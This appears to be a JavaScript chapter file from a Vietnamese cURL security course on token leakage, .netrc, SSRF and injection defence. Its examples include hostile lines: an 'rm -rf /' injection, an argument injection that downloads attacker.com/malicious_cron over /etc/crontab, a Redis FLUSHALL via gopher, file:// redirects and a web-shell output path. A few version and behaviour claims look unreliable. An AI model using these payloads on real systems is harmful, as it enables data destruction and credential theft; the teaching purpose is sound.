/**
 * Chương 19: Bảo Mật Thực Chiến: Chống Lộ Token, .netrc, Chống SSRF & Injection Trong CI/CD (data/curl/chapters/ch19.js)
 * Cấp độ: Chuyên sâu | Thời lượng: ~35 phút | cURL tối thiểu: 7.50.0 (--proto ≥ 7.19.4, --proto-redir ≥ 7.20.0, --netrc-file ≥ 7.11.0)
 * Định dạng chuẩn hóa 11 mục bắt buộc theo quy chuẩn sư phạm chuyên sâu
 */

(function () {
  'use strict';

  var CHAPTER_DATA = {
    id: 'ch19',
    meta: {
      id: 'ch19',
      order: 19,
      title: 'Bảo Mật Thực Chiến: Chống Lộ Token, .netrc, Chống SSRF & Injection Trong CI/CD',
      level: 'Chuyên sâu',
      curlMinVersion: '7.50.0',
      qaStatus: 'verified'
    },
    partId: 'level-3',
    partTitle: 'Cấp độ 3: Chuyên Sâu & Production Hardening',
    number: '19',
    title: 'Bảo Mật Thực Chiến: Chống Lộ Token, .netrc, Chống SSRF & Injection Trong CI/CD',
    subtitle: 'Đóng kín mọi lỗ hổng rò rỉ credential trong Process Table, phân quyền tệp tin .netrc chuẩn chmod 600, thiết lập lá chắn SSRF với --proto, và quy trình Audit an ninh chuyên sâu trước khi release Production',
    level: 'Chuyên sâu',
    duration: '35 phút',
    curlMinVersion: '7.50.0',
    shells: ['bash', 'powershell', 'cmd'],

    // 1. Mục tiêu bài học (Objectives Box)
    objectives: [
      'Hiểu sâu cơ chế rò rỉ secret trong Process Table (`ps aux`, `/proc/$PID/cmdline`, Windows Task Manager) khi truyền credentials qua cờ dòng lệnh, và thành thạo các giải pháp che giấu tuyệt đối qua `--config -` (stdin) và biến môi trường.',
      'Quản trị thông tin xác thực an toàn bằng tệp tin `.netrc` và `--netrc-file`: Cấu trúc tệp, quy chuẩn phân quyền bắt buộc `chmod 600` trên Unix / bảo vệ DACL trên Windows NTFS để bảo vệ thông tin đăng nhập.',
      'Thiết lập lá chắn phòng ngự tấn công SSRF (Server-Side Request Forgery): Sử dụng cặp cờ cốt lõi `--proto =http,https` và `--proto-redir =http,https` nhằm triệt tiêu hoàn toàn nguy cơ truy cập tệp cục bộ (`file:///etc/passwd`) hoặc pivot sang dịch vụ nội bộ qua `gopher://`, `dict://`, `tftp://`.',
      'Ngăn chặn triệt để tấn công Command Injection và Argument Injection: Áp dụng kỹ thuật bọc quoting chuẩn mực và tận dụng cờ `--url-query` thay vì nối chuỗi biến người dùng vào URL.',
      'Nắm vững Checklist 10 Điểm Vàng Kiểm Định An Ninh (Security Audit Checklist): Tự động hóa việc quét mã và đánh giá rủi ro an toàn của mọi câu lệnh cURL trước khi tích hợp vào CI/CD pipeline và đưa vào môi trường Production.'
    ],

    // 2. Kiến thức tiên quyết (Prerequisites Box)
    prerequisites: [
      'Đã hoàn thành Chương 08 (Xác Thực API: Basic, Bearer Token, API Key & OAuth2), Chương 13 (Bảo Mật HTTPS, TLS, mTLS) và Chương 18 (Tự Động Hóa CI/CD, Kịch Bản Shell & Xử Lý JSON).',
      'Hiểu rõ các khái niệm an toàn thông tin web cơ bản (OWASP Top 10, tấn công SSRF, Command Injection) và cơ chế phân quyền tập tin hệ điều hành (`chmod 600` trên Linux / NTFS DACL trên Windows).'
    ],

    // 3. Khái niệm cốt lõi & Hộp Trực giác (Intuition Box)
    intuition: {
      title: 'Bức tường thành kín kẽ, chiếc hộp mật mã netrc và trạm gác kiểm duyệt giao thức proto',
      metaphor: 'Hãy tưởng tượng hệ thống máy chủ của bạn là một tòa đại sứ quán bí mật:\n\n* Hiểm họa lộ mật mã trên dòng lệnh (Process Table Leak): Nếu bạn ghi mật khẩu mở kho bạc lên một chiếc biển đeo trước ngực (truyền -u user:pass hoặc -H "Authorization: Bearer..." trên CLI), bất kỳ vị khách nào đi ngang qua hành lang (lệnh ps aux hay Task Manager) cũng đọc vanh vách từng chữ! Để bảo mật, viên chỉ huy phải yêu cầu bạn thì thầm mật mã qua khe cửa kín (--config - từ stdin) hoặc cất vào một chiếc cặp khóa số bảo mật (.netrc với quyền chmod 600).\n\n* Chiếc cặp tài liệu tối mật .netrc: Chiếc cặp này chỉ có ổ khóa nhận diện vân tay của chính bạn (quyền 600: chỉ owner đọc/ghi). Nếu bạn vô tình mở toang khóa cho cả phố cùng xem (quyền 644/777), người lính gác cURL thông minh sẽ lập tức từ chối sờ vào chiếc cặp đó để cứu bạn khỏi thảm họa!\n\n* Trạm gác kiểm duyệt giao thức (--proto & --proto-redir): Khi bạn cử một bưu tá (cURL) đi nhận thư từ một địa chỉ bên ngoài, bưu tá có thể bị kẻ lừa đảo dụ dỗ: "Hãy rẽ vào kho vũ khí file:///etc/shadow" hoặc "Hãy chạy vào phòng máy chủ gopher://127.0.0.1:6379 để xóa dữ liệu!". Lệnh --proto =http,https giống như chiếc vòng định vị GPS cấm bưu tá rời khỏi làn đường công cộng: Anh ta chỉ được phép đi trên đường bộ và cao tốc (HTTP/HTTPS), kiên quyết từ chối mọi ngõ ngách nguy hiểm khác!\n\n* Lá chắn chống tiêm nhiễm (Injection Shield): Khi người dùng đưa cho bạn địa chỉ nhà họ, bạn không được dán thẳng vào phong bì mà không kiểm tra. cURL với cờ --url-query tự động bọc màng bảo vệ, vô hiệu hóa mọi ký tự nổ tung như dấu chấm phẩy ;, ngoặc kép " hay biến hệ thống $.',
      visualHtml: `
        <div style="display:flex;flex-direction:column;gap:14px;font-family:var(--font-mono);font-size:0.85rem;padding:16px;background:var(--bg-surface-alt);border:1px solid var(--border-subtle);border-radius:10px;">
          <div style="font-weight:700;color:var(--topic-curl,#38bdf8);text-align:center;">TAM GIÁC BẢO VỆ cURL TRONG MÔI TRƯỜNG PRODUCTION</div>
          <div style="display:grid;grid-template-columns:repeat(auto-fit, minmax(220px, 1fr));gap:10px;">
            <div style="padding:10px;background:var(--bg-surface);border:1px solid var(--border-subtle);border-radius:6px;">
              <div style="color:#ef4444;font-weight:700;">1. Chống Process Leak</div>
              <div style="font-size:0.75rem;color:var(--text-secondary);margin-top:4px;">
                Cấm: <code>-u user:pass</code> trên CLI<br/>
                Dùng: <code>--config -</code> qua stdin<br/>
                File: <code>.netrc</code> (chmod 600)<br/>
                Tránh lộ qua <code>ps aux</code> / Proc.
              </div>
            </div>
            <div style="padding:10px;background:var(--bg-surface);border:1px solid var(--border-subtle);border-radius:6px;">
              <div style="color:#38bdf8;font-weight:700;">2. Lá Chắn SSRF Whitelist</div>
              <div style="font-size:0.75rem;color:var(--text-secondary);margin-top:4px;">
                Cờ: <code>--proto =http,https</code><br/>
                Redirect: <code>--proto-redir =http,https</code><br/>
                Chặn: <code>file://</code>, <code>gopher://</code><br/>
                Bảo vệ Cloud Metadata (169.254).
              </div>
            </div>
            <div style="padding:10px;background:var(--bg-surface);border:1px solid var(--border-subtle);border-radius:6px;">
              <div style="color:#10b981;font-weight:700;">3. Chống Command Injection</div>
              <div style="font-size:0.75rem;color:var(--text-secondary);margin-top:4px;">
                Cấm: Nối chuỗi URL thô<br/>
                Dùng: <code>--url-query key=val</code><br/>
                Quoting: Luôn bọc nháy kép <code>"$VAR"</code><br/>
                Không bao giờ <code>eval curl</code>.
              </div>
            </div>
          </div>
        </div>
      `
    },

    // 4. Bảng tra cứu Options trong bài (Options Table)
    optionsTable: [
      {
        flag: '-n',
        longFlag: '--netrc',
        description: 'Tự động quét và nạp thông tin đăng nhập từ tệp tin ~/.netrc hoặc %USERPROFILE%\\.netrc của người dùng hiện tại.',
        minVersion: '7.0.0'
      },
      {
        flag: '--netrc-file',
        longFlag: '--netrc-file <filename>',
        description: 'Chỉ định đường dẫn tệp tin cấu hình credentials tùy chỉnh thay cho tệp tin .netrc mặc định.',
        minVersion: '7.11.0'
      },
      {
        flag: '--netrc-optional',
        longFlag: '--netrc-optional',
        description: 'Ưu tiên đọc credential trong .netrc, nhưng nếu không tìm thấy machine khớp thì tiếp tục request mà không báo lỗi.',
        minVersion: '7.10.6'
      },
      {
        flag: '--proto',
        longFlag: '--proto <protocols>',
        description: 'Giới hạn danh sách giao thức mạng được phép kết nối (phòng thủ SSRF tối quan trọng, ví dụ: =http,https).',
        minVersion: '7.19.4'
      },
      {
        flag: '--proto-redir',
        longFlag: '--proto-redir <protocols>',
        description: 'Giới hạn danh sách giao thức mạng được phép chuyển hướng tới khi theo dõi redirect (ngăn chặn SSRF pivot sang file:// hoặc gopher://).',
        minVersion: '7.20.0'
      },
      {
        flag: '-K',
        longFlag: '--config <file>',
        description: 'Nạp tham số từ file cấu hình hoặc luồng stdin (--config -) chống lộ bí mật trong bảng tiến trình hệ thống.',
        minVersion: '7.0.0'
      },
      {
        flag: '--pinnedpubkey',
        longFlag: '--pinnedpubkey <hashes>',
        description: 'Ghim khóa công khai của server (SHA256 hash) ngăn ngừa tuyệt đối tấn công MitM giả mạo CA chứng chỉ số.',
        minVersion: '7.39.0'
      }
    ],

    // 5. Các lớp giải thích (Sections) & Ví dụ thực hành Đa Shell
    sections: [
      {
        id: 'sec-01',
        title: 'Lớp 1: Hiểm Họa Process Table Leak (ps aux / Task Manager) & Giải Pháp Che Giấu Secret Tuyệt Đối',
        content: `
          <p>Khi gọi cURL trong kịch bản shell hoặc CI/CD, sai lầm phổ biến nhất của lập trình viên là truyền trực tiếp Secret qua đối số dòng lệnh:</p>
          <pre class="code-pre" style="background:var(--bg-code);padding:10px;border-radius:4px;"><code># NGUY HIỂM CHẾT NGƯỜI: Lộ mật khẩu trong bảng tiến trình hệ thống!
curl.exe -u admin:SuperSecretP@ssword123 https://api.corp.internal/data
curl.exe -H "Authorization: Bearer eyJhbGciOi..." https://api.corp.internal/data</code></pre>

          <h3>Tại Sao Đây Là Lỗ Hổng Nghiêm Trọng (CWE-214 / CWE-532)?</h3>
          <div style="background:var(--bg-surface);border-left:4px solid #ef4444;padding:12px;margin:12px 0;border-radius:0 6px 6px 0;">
            <p>Trên hệ điều hành Linux/Unix, mọi tiến trình đang chạy đều hiển thị toàn bộ các đối số dòng lệnh của nó trong hệ thống tệp ảo <code>/proc/$PID/cmdline</code>. Bất kỳ người dùng cục bộ nào, hoặc bất kỳ container nào chạy cùng máy chủ chia sẻ PID namespace, chỉ cần gõ <code>ps aux</code> hoặc <code>top</code> là có thể đọc trần trụi toàn bộ mật khẩu và Bearer Token của bạn!</p>
            <p>Tương tự trên Windows, công cụ <strong>Process Explorer</strong> hoặc <strong>Task Manager</strong> (thêm cột Command Line) cho phép mọi tiến trình cấp User đọc được toàn bộ chuỗi lệnh khởi tạo.</p>
          </div>

          <h3>Giải Pháp 1: Nạp Bí Mật Qua Stdin Bằng <code>--config -</code></h3>
          <p>cURL hỗ trợ nạp cấu hình trực tiếp từ luồng <code>stdin</code> bằng cú pháp <code>--config -</code>. Dữ liệu truyền qua stdin chỉ tồn tại trong bộ nhớ RAM tạm thời và <strong>hoàn toàn vô hình</strong> trước các lệnh giám sát tiến trình:</p>
          <pre class="code-pre" style="background:var(--bg-code);padding:10px;border-radius:4px;"><code>echo 'header = "Authorization: Bearer MY_SECRET_TOKEN"' | curl.exe -sS --config - "URL"</code></pre>

          <h3>Giải Pháp 2: Nạp Credentials Qua Tệp Cấu Hình Tạm Thời</h3>
          <p>Viết secret vào một file tạm có phân quyền khép kín, gọi <code>curl -K config.txt</code>, sau đó lập tức xóa file tạm thông qua chốt dọn dẹp <code>trap 'rm -f "$TMP_CONF"' EXIT</code>.</p>
        `,
        codeExamples: [
          {
            id: 'ex-ch19-sec01',
            title: 'Ví dụ 1: Truyền Custom Header / Secret Tuyệt Đối An Toàn Qua Stdin Bằng --config -',
            minVersion: '7.50.0',
            verificationStatus: 'verified_real',
            commands: {
              bash: '# Truyền header bảo mật qua stdin (không lộ trong ps aux):\necho \'header = "X-Secret-Auth: supersecret"\' | curl.exe -sS --config - "http://127.0.0.1:8789/echo" | grep -o \'"x-secret-auth": "supersecret"\'',
              powershell: '# Trong PowerShell, pipe chuỗi cấu hình sang curl qua stdin:\n"header = `"X-Secret-Auth: supersecret`"" | curl.exe -sS --config - "http://127.0.0.1:8789/echo" | Select-String "supersecret"',
              cmd: 'echo header = "X-Secret-Auth: supersecret" | curl.exe -sS --config - "http://127.0.0.1:8789/echo"'
            },
            realOutput: `"x-secret-auth": "supersecret"`,
            explanationTokens: [
              { token: '--config -', meaning: 'Chỉ thị cho cURL đọc cấu hình từ luồng stdin thay vì tệp tin trên ổ đĩa' },
              { token: 'header = "..."', meaning: 'Cú pháp chỉ định HTTP header trong tệp cấu hình của cURL' }
            ]
          }
        ]
      },
      {
        id: 'sec-02',
        title: 'Lớp 2: Quản Lý Thông Tin Xác Thực Bằng .netrc & --netrc-file Chuẩn Quyền Hạn chmod 600',
        content: `
          <p>Tiêu chuẩn <strong>.netrc</strong> xuất phát từ kỷ nguyên Unix cổ điển nhưng vẫn là một trong những cơ chế quản lý thông tin xác thực thanh lịch và an toàn nhất của cURL.</p>

          <h3>Cấu Trúc Tệp Tin <code>.netrc</code></h3>
          <pre class="code-pre" style="background:var(--bg-code);padding:10px;border-radius:4px;"><code>machine api.corp.internal
login bot-ci
password token-xyz-987

machine github.corp.internal
login deploy-runner
password ghp_SecretDeployKey456</code></pre>
          <p>Khi bạn gọi <code>curl -n https://api.corp.internal/data</code>, cURL tự động đọc tệp tin <code>~/.netrc</code>, tìm kiếm khối <code>machine</code> khớp với hostname của request, và tự động tạo header <code>Authorization: Basic ...</code> mà bạn không cần phải viết username/password lên dòng lệnh!</p>

          <h3>Quy Chuẩn Bắt Buộc: Phân Quyền <code>chmod 600</code></h3>
          <div style="background:var(--bg-surface);border:1px solid var(--border-subtle);padding:12px;border-radius:6px;margin:10px 0;">
            <p><strong>Trên Linux / macOS:</strong> Bạn bắt buộc phải chạy lệnh <code>chmod 600 ~/.netrc</code> (chỉ cho phép Owner đọc và ghi, cấm hoàn toàn Group và Others). Nếu tệp tin có quyền mở (như <code>chmod 644</code> hoặc <code>777</code>), cURL sẽ từ chối nạp hoặc in cảnh báo an ninh nghiêm khắc!</p>
            <p><strong>Trên Windows:</strong> Đường dẫn mặc định là <code>%USERPROFILE%\\.netrc</code>. Hãy đảm bảo danh sách kiểm soát quyền truy cập (DACL) của NTFS chỉ cấp quyền Read cho tài khoản Windows hiện tại.</p>
          </div>

          <h3>Tùy Biến Đường Dẫn Với Cờ <code>--netrc-file</code> Trong CI/CD</h3>
          <p>Trong các runner tự động hóa, bạn có thể tạo tệp credential riêng cho từng job và chỉ định đường dẫn cụ thể bằng <code>--netrc-file &lt;filename&gt;</code>. Khi kết thúc job, tệp tin này sẽ được xóa tự động mà không ảnh hưởng tới người dùng hệ thống.</p>
        `,
        codeExamples: [
          {
            id: 'ex-ch19-sec02',
            title: 'Ví dụ 2: Xác Thực Tự Động Bằng Tệp Credential --netrc-file Không Cần Ghi Mật Khẩu Trên CLI',
            minVersion: '7.11.0',
            verificationStatus: 'verified_real',
            commands: {
              bash: '# Tạo tệp netrc và gửi request với --netrc-file:\necho "machine 127.0.0.1 login bot-ci password token-xyz-987" > test.netrc\ncurl.exe -sS --netrc-file test.netrc "http://127.0.0.1:8789/echo" | grep -o \'"authorization": "Basic [^\"]*"\'\nrm -f test.netrc',
              powershell: '# Trong PowerShell: tạo credential file tạm và nạp qua --netrc-file:\n"machine 127.0.0.1 login bot-ci password token-xyz-987" | Out-File -Encoding ascii test.netrc\ncurl.exe -sS --netrc-file test.netrc "http://127.0.0.1:8789/echo" | Select-String "authorization"\nRemove-Item test.netrc',
              cmd: 'echo machine 127.0.0.1 login bot-ci password token-xyz-987 > test.netrc && curl.exe -sS --netrc-file test.netrc "http://127.0.0.1:8789/echo" && del test.netrc'
            },
            realOutput: `"authorization": "Basic Ym90LWNpOnRva2VuLXh5ei05ODc="`,
            explanationTokens: [
              { token: '--netrc-file test.netrc', meaning: 'Chỉ thị cho cURL nạp thông tin đăng nhập tự động từ tệp netrc chỉ định' },
              { token: 'Basic Ym90LWNp...', meaning: 'Chuỗi Base64 mã hóa tự động từ cặp bot-ci:token-xyz-987' }
            ]
          }
        ]
      },
      {
        id: 'sec-03',
        title: 'Lớp 3: Phòng Ngự Tấn Công SSRF Với --proto & --proto-redir (Lá Chắn Độc Học Redirect)',
        content: `
          <p><strong>SSRF (Server-Side Request Forgery)</strong> là một trong những lỗ hổng bảo mật xếp hạng cao nhất trong OWASP Top 10 API Security. Lỗ hổng này xảy ra khi máy chủ của bạn nhận một URL do người dùng cung cấp và sử dụng cURL để tải dữ liệu về.</p>

          <h3>Hai Kịch Bản Khai Thác SSRF Chết Người Qua cURL</h3>
          <ol>
            <li><strong>Đánh cắp Cloud Instance Metadata:</strong>
              <p>Trên AWS, GCP hoặc Azure, dịch vụ metadata nội bộ nằm tại địa chỉ <code>http://169.254.169.254/latest/meta-data/</code>. Kẻ tấn công cung cấp URL này để cURL nội bộ tải về toàn bộ IAM Role Credentials tạm thời, chiếm quyền kiểm soát toàn bộ hạ tầng đám mây!</p>
            </li>
            <li><strong>Chuyển Hướng Độc Hại &amp; Pivot Giao Thức (Redirect Smuggling):</strong>
              <p>Kẻ tấn công cung cấp một URL tưởng như vô hại: <code>https://attacker.com/avatar.png</code>. Nhưng máy chủ của kẻ tấn công trả về mã chuyển hướng:</p>
              <pre class="code-pre" style="background:var(--bg-code);padding:8px;border-radius:4px;"><code>HTTP/1.1 302 Found
Location: file:///etc/passwd</code></pre>
              <p>Nếu bạn sử dụng cờ theo dõi chuyển hướng <code>-L</code> trần trụi, cURL sẽ ngây thơ tuân theo chỉ thị và <strong>đọc tệp tin <code>/etc/passwd</code> trên máy chủ nội bộ</strong> rồi gửi trả về cho kẻ tấn công! Nghiêm trọng hơn, nếu hệ thống hỗ trợ giao thức <code>gopher://</code>, kẻ tấn công có thể điều khiển cURL gửi lệnh thô vào Redis hoặc Memcached nội bộ (<code>gopher://127.0.0.1:6379/_FLUSHALL</code>)!</p>
            </li>
          </ol>

          <h3>Lá Chắn Bất Khả Xâm Phạm: <code>--proto</code> &amp; <code>--proto-redir</code></h3>
          <p>cURL cung cấp hai cờ kiểm soát giao thức nghiêm ngặt bậc nhất:</p>
          <pre class="code-pre" style="background:var(--bg-code);padding:10px;border-radius:4px;"><code>curl.exe --proto =http,https --proto-redir =http,https -L "URL"</code></pre>
          <div style="background:var(--bg-surface);border:1px solid var(--border-subtle);padding:12px;border-radius:6px;margin:10px 0;">
            <ul>
              <li><code>--proto =http,https</code>: Cấm cURL khởi tạo kết nối bằng bất kỳ giao thức nào khác ngoài HTTP và HTTPS. Các giao thức nguy hiểm như <code>file://</code>, <code>dict://</code>, <code>tftp://</code>, <code>gopher://</code> lập tức bị chặn đứng.</li>
              <li><code>--proto-redir =http,https</code>: Khóa chặt các bước chuyển hướng redirect (khi dùng cờ <code>-L</code>). Dù máy chủ phản hồi <code>Location: file:///etc/shadow</code>, cURL lập tức từ chối thực thi và báo lỗi ngay!</li>
            </ul>
          </div>
        `,
        codeExamples: [
          {
            id: 'ex-ch19-sec03',
            title: 'Ví dụ 3: Thử Nghiệm Kích Hoạt Lá Chắn --proto Chặn Đứng Kết Nối Giao Thức Không Cho Phép',
            minVersion: '7.19.4',
            verificationStatus: 'verified_real',
            commands: {
              bash: '# Chỉ cho phép HTTPS, cURL lập tức từ chối và chặn đứng giao thức HTTP nguy hiểm:\ncurl.exe -sS --proto =https "http://127.0.0.1:8789/ping" 2>&1 || true',
              powershell: '# Trong PowerShell: kiểm tra mã lỗi chặn giao thức:\ncurl.exe -sS --proto =https "http://127.0.0.1:8789/ping" 2>&1',
              cmd: 'curl.exe -sS --proto =https "http://127.0.0.1:8789/ping"'
            },
            realOutput: `curl: (1) Protocol "http" is disabled`,
            explanationTokens: [
              { token: '--proto =https', meaning: 'Chỉ cho phép duy nhất giao thức HTTPS, vô hiệu hóa mọi giao thức khác' },
              { token: 'curl: (1) Protocol "http" is disabled', meaning: 'Mã lỗi 1: cURL chủ động bảo vệ hệ thống khỏi giao thức nằm ngoài danh sách trắng' }
            ]
          }
        ]
      },
      {
        id: 'sec-04',
        title: 'Lớp 4: Phòng Chống Command Injection & Bảng Checklist 10 Điểm Vàng Audit An Ninh CI/CD',
        content: `
          <p>Khi tích hợp cURL vào các kịch bản shell tự động hóa, một sai lầm chết người khác là <strong>nối chuỗi biến người dùng vào câu lệnh</strong>:</p>
          <pre class="code-pre" style="background:var(--bg-code);padding:10px;border-radius:4px;"><code># LỖ HỔNG COMMAND INJECTION:
QUERY="laptop; rm -rf /"
curl.exe "https://api.corp/search?q=$QUERY"   # Ký tự ; có thể phá vỡ lệnh shell!

# LỖ HỔNG ARGUMENT INJECTION:
FILENAME="--output /etc/crontab"
curl.exe $FILENAME "https://attacker.com/malicious_cron" # cURL bị ép ghi đè file hệ thống!</code></pre>

          <h3>Giải Pháp Phòng Thủ Triệt Để</h3>
          <ul>
            <li><strong>Luôn bọc nháy kép biến shell:</strong> Luôn viết <code>"$VAR"</code>, không bao giờ để biến trần trụi.</li>
            <li><strong>Sử dụng cờ mã hóa an toàn <code>--url-query</code>:</strong> Kể từ cURL 7.76.0, hãy dùng <code>--url-query "q=$USER_INPUT"</code>. cURL sẽ tự động mã hóa URL các ký tự đặc biệt, ngăn chặn hoàn toàn việc tiêm nhiễm đối số dòng lệnh hoặc phá vỡ cấu trúc URL.</li>
            <li><strong>Tuyệt đối không dùng <code>eval</code>:</strong> Không bao giờ thực thi chuỗi lệnh cURL được ghép động bằng hàm <code>eval</code>.</li>
          </ul>

          <h3>Bảng Checklist 10 Điểm Vàng Audit An Ninh cURL Cho Production &amp; CI/CD</h3>
          <div style="background:var(--bg-surface);border:1px solid var(--border-subtle);padding:12px;border-radius:6px;margin:10px 0;">
            <ol>
              <li>[ ] <strong>Tuyệt đối cấm cờ <code>-k</code> / <code>--insecure</code></strong> trên toàn bộ mã nguồn và pipeline CI/CD.</li>
              <li>[ ] <strong>Không truyền Secret qua dòng lệnh:</strong> Dùng <code>--config -</code> qua stdin hoặc <code>.netrc</code> (chmod 600).</li>
              <li>[ ] <strong>Bảo vệ Process List:</strong> Đảm bảo biến môi trường nhạy cảm đã được Masking trong GitHub Actions.</li>
              <li>[ ] <strong>Khóa cứng giao thức SSRF:</strong> Luôn khai báo <code>--proto =http,https --proto-redir =http,https</code>.</li>
              <li>[ ] <strong>Không dùng <code>--location-trusted</code></strong> khi redirect có thể dẫn sang domain bên thứ ba.</li>
              <li>[ ] <strong>Bắt buộc cấu hình Timeout:</strong> Khai báo <code>--connect-timeout 5 --max-time 30</code> chống treo tiến trình.</li>
              <li>[ ] <strong>Fail-Fast an toàn:</strong> Sử dụng <code>-sS --fail-with-body</code> để bắt mã lỗi HTTP $\ge$ 400.</li>
              <li>[ ] <strong>Chốt an toàn Shell:</strong> Khai báo <code>set -euo pipefail</code> ở đầu mọi file script Bash.</li>
              <li>[ ] <strong>Chống Argument Injection:</strong> Dùng <code>--url-query</code> hoặc <code>--data-urlencode</code> thay vì nối chuỗi thô.</li>
              <li>[ ] <strong>Dọn dẹp file tạm:</strong> Cài đặt bẫy <code>trap 'rm -f $TMP_FILE' EXIT</code> để không lưu vết thông tin nhạy cảm.</li>
            </ol>
          </div>
        `,
        codeExamples: [
          {
            id: 'ex-ch19-sec04',
            title: 'Ví dụ 4: Nối Tham Số Query String Tuyệt Đối An Toàn Chống Injection Bằng cờ --url-query',
            minVersion: '7.76.0',
            verificationStatus: 'verified_real',
            commands: {
              bash: '# Dùng cờ --url-query để tự động mã hóa ký tự đặc biệt mà không sợ vỡ cú pháp:\ncurl.exe -sS --url-query "q=search & test; injection" "http://127.0.0.1:8789/echo" | grep -o \'"q": "search & test; injection"\'',
              powershell: '# Trong PowerShell, cờ --url-query tự động URL-encode các ký tự khoảng trắng và dấu chấm phẩy:\ncurl.exe -sS --url-query "q=search & test; injection" "http://127.0.0.1:8789/echo" | Select-String "search & test; injection"',
              cmd: 'curl.exe -sS --url-query "q=search & test; injection" "http://127.0.0.1:8789/echo"'
            },
            realOutput: `"q": "search & test; injection"`,
            explanationTokens: [
              { token: '--url-query "q=search & test; injection"', meaning: 'Tự động URL-encode khoảng trắng và ký tự đặc biệt an toàn' },
              { token: '"q": "search & test; injection"', meaning: 'Server nhận đúng tham số query đã được giải mã chính xác' }
            ]
          }
        ]
      }
    ],

    // 6. Cạm bẫy thường gặp & Cảnh báo an ninh (Callouts Box)
    callouts: {
      warning: {
        title: 'CẢNH BÁO AN NINH CỰC ĐỘ: RỦI RO RÒ RỈ SECRET TRONG PROCESS TABLE VÀ CHUYỂN HƯỚNG SSRF TỚI CLOUD METADATA',
        content: 'Hai thảm họa bảo mật phổ biến nhất khi vận hành cURL ở cấp độ Enterprise:\n1) Lộ Credentials qua Process Table (`/proc/$PID/cmdline`): Mọi đối số truyền sau `-u` hoặc `-H "Authorization: ..."` đều bị phơi bày cho tất cả người dùng và container trên cùng máy chủ. Bắt buộc phải thay thế bằng `--config -` (stdin) hoặc `.netrc` (chmod 600)!\n2) Tấn công SSRF chiếm quyền Cloud Metadata: Nếu ứng dụng cho phép người dùng nhập URL tải ảnh/file mà bạn dùng `curl -L "$URL"` không kiểm soát, kẻ tấn công có thể chỉ định `http://169.254.169.254/latest/meta-data/iam/security-credentials/` hoặc phản hồi redirect 302 sang `file:///etc/shadow` để cướp toàn bộ chìa khóa hệ thống! Bắt buộc phải khóa cứng `--proto =http,https --proto-redir =http,https`.'
      },
      pitfalls: [
        {
          title: 'Phân quyền file .netrc quá mở khiến cURL từ chối hoặc bị user khác đọc trộm',
          content: 'Nếu file `.netrc` để quyền mặc định `chmod 644` (cho phép cả hệ thống đọc), mọi tài khoản người dùng khác trên server đều có thể đọc được mật khẩu của bạn. Trên Linux, cURL sẽ cảnh báo nghiêm khắc hoặc từ chối nạp file nếu quyền không phải là `600`.'
        },
        {
          title: 'Dùng cờ -L theo dõi chuyển hướng mà quên --proto-redir',
          content: 'Máy chủ đích ban đầu có thể là HTTPS, nhưng khi redirect nó trả về `Location: file:///etc/passwd` hoặc `gopher://127.0.0.1:6379`. Nếu không có `--proto-redir =http,https`, cURL sẽ tự động đọc file hệ thống hoặc pivot lệnh sang Redis.'
        },
        {
          title: 'Nối chuỗi URL thô từ biến người dùng dẫn đến Command hoặc Argument Injection',
          content: 'Nếu biến `$URL` chứa chuỗi `--output /var/www/shell.php`, cURL sẽ diễn giải nó thành một cờ đối số mới thay vì là URL! Luôn dùng `--` để kết thúc danh sách cờ, hoặc dùng `--url-query` để truyền tham số.'
        },
        {
          title: 'Lạm dụng cờ --location-trusted gửi Secret sang domain của bên thứ ba',
          content: 'Cờ `--location-trusted` chỉ thị cho cURL tiếp tục gửi Authorization header ngay cả khi redirect sang một domain hoàn toàn khác. Kẻ tấn công có thể lợi dụng điều này để chiếm đoạt token xác thực của bạn.'
        },
        {
          title: 'Dùng cờ -k / --insecure để sửa lỗi tạm thời rồi vô tình đẩy lên Production',
          content: 'Bỏ qua xác thực chứng chỉ số SSL/TLS với `-k` là nguyên nhân hàng đầu dẫn đến tấn công Man-in-the-Middle (MitM). Hãy dùng `--cacert` hoặc nạp chứng chỉ nội bộ vào hệ thống thay vì tắt kiểm tra an ninh.'
        }
      ],
      tips: [
        {
          title: 'Khóa cứng giao thức mặc định với --proto-default https',
          content: 'Nếu người dùng nhập URL không có tiền tố giao thức (ví dụ: `api.corp.internal`), hãy thêm cờ `--proto-default https` để cURL luôn ưu tiên mã hóa an toàn thay vì tự động thử `http://` không bảo mật.'
        },
        {
          title: 'Tự động dọn dẹp file cấu hình nhạy cảm bằng trap shell',
          content: 'Trong Bash script, luôn khai báo: `trap \'rm -f "$TMP_CONFIG"\' EXIT INT TERM`. Dù script thành công hay bị ngắt đột ngột bằng Ctrl+C, file chứa token tạm thời cũng sẽ được xóa sạch ngay lập tức.'
        },
        {
          title: 'Sử dụng biến môi trường CURL_CA_BUNDLE thay vì hardcode cờ --cacert',
          content: 'Trong môi trường Docker hoặc Kubernetes, hãy thiết lập biến môi trường `export CURL_CA_BUNDLE=/etc/ssl/certs/corporate-ca.pem`. Mọi lệnh cURL trong container sẽ tự động áp dụng chứng chỉ số nội bộ mà không cần thêm cờ trên CLI.'
        }
      ],
      deepDive: {
        title: 'Kiến Trúc Bộ Nhớ Tiến Trình (Process Memory Space) & Sự Phơi Bày Của /proc/$PID/cmdline',
        content: `
          <p>Tại sao hệ điều hành lại cho phép các tiến trình khác đọc được đối số dòng lệnh của cURL?</p>
          <p>Khi bạn thực thi một lệnh trên Linux, hàm hệ thống <code>execve()</code> nhận mảng đối số <code>argv[]</code> và sao chép nó vào vùng nhớ đầu tiên của ngăn xếp tiến trình (Stack). Nhân Linux (Kernel) tự động phơi bày vùng nhớ này thông qua hệ thống tệp ảo <code>/proc/$PID/cmdline</code> để phục vụ các công cụ quản trị hệ thống như <code>ps</code>, <code>top</code>, <code>htop</code>.</p>
          <p>Theo mặc định trong mô hình bảo mật truyền thống của Unix, <em>mọi tiến trình cùng chạy dưới bất kỳ tài khoản người dùng bình thường nào đều có quyền đọc <code>/proc/$PID/cmdline</code> của nhau</em>. Điều đó có nghĩa là nếu một lập trình viên chạy <code>curl -u admin:secret</code>, thì một người dùng khác hoặc một tiến trình bị xâm nhập chạy cùng máy có thể liên tục theo dõi <code>/proc</code> và chụp lại mật khẩu trong tích tắc!</p>
